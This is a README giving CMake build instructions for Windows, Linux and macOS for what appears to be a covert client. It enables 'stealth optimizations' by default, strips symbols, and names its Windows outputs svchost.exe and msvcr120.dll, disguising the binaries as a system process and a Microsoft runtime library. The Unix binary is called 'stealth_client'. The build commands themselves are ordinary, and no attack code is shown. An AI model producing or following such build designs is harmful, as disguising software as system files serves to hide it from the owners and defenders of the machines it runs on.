# Cross-Platform Build Instructions

This project supports building on Windows, Linux, and macOS with platform-specific optimizations and stealth features.

## Prerequisites

### All Platforms
- CMake 3.16 or higher
- C++17 compatible compiler

### Windows
- Visual Studio 2019 or later (with MSVC)
- Windows SDK

### Linux
- GCC 7+ or Clang 6+
- Build essentials: `sudo apt-get install build-essential cmake`

### macOS
- Xcode Command Line Tools: `xcode-select --install`
- CMake: `brew install cmake`

## Quick Build

### Windows
```batch
build_windows.bat
```

### Linux
```bash
chmod +x build_linux.sh
./build_linux.sh
```

### macOS
```bash
chmod +x build_macos.sh
./build_macos.sh
```

## Manual Build

### 1. Create Build Directory
```bash
mkdir build
cd build
```

### 2. Configure with CMake
```bash
# Release build with stealth optimizations
cmake .. -DCMAKE_BUILD_TYPE=Release -DENABLE_STEALTH_BUILD=ON

# Debug build
cmake .. -DCMAKE_BUILD_TYPE=Debug -DENABLE_STEALTH_BUILD=OFF
```

### 3. Build

**Windows:**
```batch
cmake --build . --config Release
```

**Linux/macOS:**
```bash
make -j$(nproc)  # Linux
make -j$(sysctl -n hw.ncpu)  # macOS
```

## Build Options

- `ENABLE_STEALTH_BUILD`: Enable maximum stealth optimizations (default: ON)
- `CMAKE_BUILD_TYPE`: Release or Debug

## Output Files

### Windows
- Executable: `bin/Release/svchost.exe`
- DLL: `Release/msvcr120.dll`

### Linux/macOS
- Executable: `bin/stealth_client`

## Platform-Specific Features

### Windows
- Advanced MSVC optimizations
- Link-time code generation (LTCG)
- Symbol stripping
- Manifest embedding
- DLL version available

### Linux
- GCC/Clang optimizations
- Stack protection
- Position-independent code
- Symbol visibility control

### macOS
- Clang optimizations
- Dead code stripping
- Framework linking
- Code signing ready

## Troubleshooting

### Missing Dependencies
- Ensure all required libraries are installed
- Check CMake version compatibility

### Build Errors
- Verify compiler version meets requirements
- Check platform-specific prerequisites
- Review CMake configuration output

### Cross-Compilation
For cross-compilation, specify the target system:
```bash
cmake .. -DCMAKE_SYSTEM_NAME=Linux -DCMAKE_C_COMPILER=gcc -DCMAKE_CXX_COMPILER=g++
```